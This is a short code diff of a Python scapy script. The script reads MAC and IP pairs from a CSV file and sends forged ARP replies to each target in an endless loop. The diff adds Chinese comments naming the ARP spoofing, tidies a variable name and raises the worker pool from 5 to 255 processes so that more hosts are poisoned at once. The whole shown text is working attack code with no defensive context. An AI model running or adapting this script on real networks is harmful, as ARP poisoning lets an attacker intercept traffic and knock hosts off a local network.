@@ -5,6 +5,7 @@ from scapy.all import *
 # sendp(eth/arp, inter=1, loop=1)
 IPADDR_FILE_PATH='./iplist.csv'
 
+#触发一次ARP欺骗
 def sent_arp(addr):
 	addr=addr.split(',')
 	sender_hwsrc=addr[0]
@@ -15,14 +16,15 @@ def sent_arp(addr):
 	eth=Ether(dst=target_hwdst,src=sender_hwsrc)
 	sendp(eth/arp, inter=1, loop=1)
 
+#多进程并发
 def load_proc(addr_file):
 	addr_list=[]
-	for addr in addr_file:
-		if addr.startswith('#'):
+	for line in addr_file:
+		if line.startswith('#'):
 			pass
 		else:
-			addr_list.append(addr.strip('\r\n'))
-	p=Pool(5)	
+			addr_list.append(line.strip('\r\n'))
+	p=Pool(255)	
 	p.map(sent_arp, addr_list)
 	p.close()
 	p.join()
